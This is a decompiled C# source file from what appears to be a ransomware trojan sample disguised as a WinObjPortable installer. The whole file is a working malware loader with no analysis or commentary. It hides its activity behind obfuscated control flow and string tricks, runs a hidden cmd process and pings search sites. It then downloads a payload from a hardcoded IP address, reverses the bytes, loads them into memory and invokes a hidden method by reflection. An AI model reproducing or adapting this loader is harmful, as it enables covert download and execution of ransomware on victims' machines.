// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp48.Google.Visitor
// Assembly: WinObjPortable_3.13_English_online.paf, Version=2.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 331439AE-1613-4586-900A-61C53660B0C2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Ransom.MSIL.PolyRansom.gen-2fb8100d4fb1ee22837aec10889c4b0303434e50944b96a390164e449eb62dee.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace WindowsFormsApp48.Google
{
  internal static class Visitor
  {
    private static Visitor ReflectDefinition;

    internal static void ComputePredicate()
    {
      string[] strArray1 = new string[4]
      {
        "http://google.com",
        "http://youtube.com",
        "http://bing.com",
        "http://yahoo.com"
      };
      int num1 = 0;
      int num2 = 3;
      while (true)
      {
        string[] strArray2;
        WebClient webClient;
        int index;
        string str;
        switch (num2)
        {
          case 1:
            strArray2 = strArray1;
            index = 0;
            num2 = 6;
            continue;
          case 2:
          case 6:
            if (index >= strArray2.Length)
            {
              ++num1;
              goto case 3;
            }
            else
              break;
          case 3:
            if (num1 >= 9)
            {
              GC.Collect();
              num2 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_2c7b33f317874d349775adf3a029cb16 == 0 ? 3 : 4;
              continue;
            }
            goto case 1;
          case 4:
            goto label_18;
          case 5:
            try
            {
              Console.WriteLine((string) Visitor.InitDefinition((object) webClient, (object) str));
              int num3 = 0;
              if (\u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_1e1b7d4620cf42ba889a9e059790f772 == 0)
                goto label_8;
label_7:
              switch (num3)
              {
                default:
                  goto label_16;
              }
label_8:
              num3 = 0;
              goto label_7;
            }
            catch
            {
            }
            finally
            {
              webClient?.Dispose();
            }
label_16:
            ++index;
            num2 = 2;
            continue;
          case 7:
            webClient = new WebClient();
            num2 = 5;
            continue;
        }
        str = strArray2[index];
        num2 = 7;
      }
label_18:;
    }

    internal static void NewPredicate()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
label_17:
      new Thread(new ThreadStart(Visitor.ComputePredicate))
      {
        IsBackground = true
      }.Start();
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/C timeout 20",
        WindowStyle = ProcessWindowStyle.Hidden
      }).WaitForExit();
      byte[] numArray = (byte[]) null;
      int num1 = 16;
      while (true)
      {
        int num2;
        int index1;
        int index2;
        int index3;
        Type[] exportedTypes;
        Type type;
        MethodInfo methodInfo;
        Assembly assembly;
        Assembly[] assemblyArray;
        bool flag;
        MethodInfo[] methods;
        switch (num1)
        {
          case 1:
            goto label_17;
          case 2:
            ++index1;
            num1 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_074b1aa682c146ddaa1e8fb2cca739aa != 0 ? 15 : 17;
            continue;
          case 3:
            flag = methodInfo.Name == "Fmybietdmtrgvub";
            num1 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_9cb6eb590e2e49808055e4864107dace != 0 ? 14 : 11;
            continue;
          case 4:
            goto label_27;
          case 5:
            type = exportedTypes[index1];
            Console.WriteLine(type.FullName);
            num1 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_7ad8a9ed4b374166ad83e8ddb0efaa7c != 0 ? 12 : 11;
            continue;
          case 6:
            index2 = 0;
            goto case 9;
          case 7:
            assembly = assemblyArray[index3];
            num1 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_869c19334e1149efaa4cb74280b3debe != 0 ? 0 : 0;
            continue;
          case 8:
            Array.Reverse((Array) numArray, 0, numArray.Length);
            num1 = 15;
            continue;
          case 9:
            if (index2 >= methods.Length)
            {
              num1 = 2;
              continue;
            }
            methodInfo = methods[index2];
            Console.WriteLine((string) Visitor.ForgotDefinition((object) methodInfo));
            num1 = 3;
            continue;
          case 10:
          case 13:
            if (index3 >= assemblyArray.Length)
            {
              num1 = 4;
              continue;
            }
            goto case 7;
          case 11:
            assemblyArray = (Assembly[]) Visitor.InstantiateDefinition((object) AppDomain.CurrentDomain);
            index3 = 0;
            num1 = 10;
            continue;
          case 12:
            methods = type.GetMethods();
            num1 = 6;
            continue;
          case 14:
            if (flag)
              methodInfo.Invoke((object) null, (object[]) null);
            ++index2;
            num2 = 9;
            break;
          case 15:
            Visitor.LogoutDefinition(Visitor.DefineDefinition(), (object) numArray);
            num1 = \u003CModule\u003E\u007B733d650e\u002De456\u002D45c0\u002Da44d\u002D64a1e0c75f2d\u007D.m_305d2c21a6eb44de8e83d3cdf960fe58 == 0 ? 1 : 11;
            continue;
          case 16:
            // ISSUE: type reference
            numArray = (byte[]) typeof (WebClient).GetMethod((string) Visitor.SearchDefinition((object) "DowKnlKoadDKata", (object) "K", (object) ""), new Type[1]
            {
              Visitor.IncludeDefinition(__typeref (string))
            }).Invoke((object) new WebClient(), new object[1]
            {
              (object) "http://82.146.63.54/Software/01171/WinObjPortable_3.13_English_online.paf.bin"
            });
            num1 = 8;
            continue;
          case 17:
            if (index1 >= exportedTypes.Length)
            {
              ++index3;
              num2 = 13;
              break;
            }
            goto case 5;
          default:
            Console.WriteLine(assembly.FullName);
            exportedTypes = assembly.GetExportedTypes();
            index1 = 0;
            goto case 17;
        }
        num1 = num2;
      }
label_27:;
    }

    internal static object InitDefinition([In] object obj0, [In] object obj1) => (object) ((WebClient) obj0).DownloadString((string) obj1);

    internal static bool LoginDefinition() => Visitor.ReflectDefinition == null;

    internal static Visitor MapDefinition() => Visitor.ReflectDefinition;

    internal static object SearchDefinition([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0).Replace((string) obj1, (string) obj2);

    internal static Type IncludeDefinition([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    internal static object DefineDefinition() => (object) AppDomain.CurrentDomain;

    internal static object LogoutDefinition([In] object obj0, [In] object obj1) => (object) ((AppDomain) obj0).Load((byte[]) obj1);

    internal static object InstantiateDefinition([In] object obj0) => (object) ((AppDomain) obj0).GetAssemblies();

    internal static object ForgotDefinition([In] object obj0) => (object) ((MemberInfo) obj0).Name;
  }
}
